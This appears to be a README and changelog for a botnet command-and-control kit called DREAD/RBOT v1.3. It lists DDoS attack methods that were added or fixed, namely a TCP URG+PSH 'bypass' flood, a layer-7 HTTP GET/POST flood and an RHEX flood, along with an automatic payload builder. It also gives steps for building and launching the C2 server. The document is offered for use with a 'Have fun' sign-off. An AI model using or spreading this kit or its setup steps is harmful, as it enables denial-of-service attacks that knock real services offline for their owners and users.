Sense the updated cnc is larger, it is recommended to use a server with:
4g ram
2 cores

If you are not able to get a server with these minimum specs, remove lines 441-601 and 1285-1479 from the cnc.c file

DREAD/RBOT v1.3
-Added "BYPASS" Method (TCP URG+PSH Flood)
-Added L7 HTTP GET/POST Flood
-Added STOP attack function
-Added Auto PAYLOAD Builder
-FIXED RHEX Flood
-Updated CNC

Have fun.

2. Add credentials to login.txt

3. sh build.sh

4. screen your c2: screen ./cnc 3074 2 1337
